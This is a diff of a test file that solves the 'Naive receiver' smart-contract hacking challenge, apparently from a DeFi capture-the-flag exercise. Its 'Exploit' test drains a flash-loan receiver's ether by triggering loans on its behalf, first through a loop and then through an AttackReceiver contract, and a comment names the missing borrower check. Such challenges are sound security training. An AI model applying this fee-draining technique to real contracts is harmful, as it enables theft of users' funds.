@@ -14,14 +14,8 @@ describe("[Challenge] Naive receiver", function () {
         /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
         [deployer, user, attacker] = await ethers.getSigners();
 
-        const LenderPoolFactory = await ethers.getContractFactory(
-            "NaiveReceiverLenderPool",
-            deployer
-        );
-        const FlashLoanReceiverFactory = await ethers.getContractFactory(
-            "FlashLoanReceiver",
-            deployer
-        );
+        const LenderPoolFactory = await ethers.getContractFactory("NaiveReceiverLenderPool", deployer);
+        const FlashLoanReceiverFactory = await ethers.getContractFactory("FlashLoanReceiver", deployer);
 
         this.pool = await LenderPoolFactory.deploy();
         await deployer.sendTransaction({
@@ -29,42 +23,30 @@ describe("[Challenge] Naive receiver", function () {
             value: ETHER_IN_POOL,
         });
 
-        expect(await ethers.provider.getBalance(this.pool.address)).to.be.equal(
-            ETHER_IN_POOL
-        );
-        expect(await this.pool.fixedFee()).to.be.equal(
-            ethers.utils.parseEther("1")
-        );
+        expect(await ethers.provider.getBalance(this.pool.address)).to.be.equal(ETHER_IN_POOL);
+        expect(await this.pool.fixedFee()).to.be.equal(ethers.utils.parseEther("1"));
 
-        this.receiver = await FlashLoanReceiverFactory.deploy(
-            this.pool.address
-        );
+        this.receiver = await FlashLoanReceiverFactory.deploy(this.pool.address);
         await deployer.sendTransaction({
             to: this.receiver.address,
             value: ETHER_IN_RECEIVER,
         });
 
-        expect(
-            await ethers.provider.getBalance(this.receiver.address)
-        ).to.be.equal(ETHER_IN_RECEIVER);
+        expect(await ethers.provider.getBalance(this.receiver.address)).to.be.equal(ETHER_IN_RECEIVER);
     });
 
     it("Exploit", async function () {
         /* Because it will take 1 ETH as fee and the flashloan doesn't check whether msg.sender and borrower are the same */
-        for (let i = 0; i < 10; i++) {
-            await this.pool.flashLoan(this.receiver.address, ETHER_IN_RECEIVER);
-        }
+        const Attack = await ethers.getContractFactory("AttackReceiver");
+        const attack = await Attack.deploy(this.pool.address, this.receiver.address);
+        await attack.attack();
     });
 
     after(async function () {
         /** SUCCESS CONDITIONS */
 
         // All ETH has been drained from the receiver
-        expect(
-            await ethers.provider.getBalance(this.receiver.address)
-        ).to.be.equal("0");
-        expect(await ethers.provider.getBalance(this.pool.address)).to.be.equal(
-            ETHER_IN_POOL.add(ETHER_IN_RECEIVER)
-        );
+        expect(await ethers.provider.getBalance(this.receiver.address)).to.be.equal("0");
+        expect(await ethers.provider.getBalance(this.pool.address)).to.be.equal(ETHER_IN_POOL.add(ETHER_IN_RECEIVER));
     });
 });
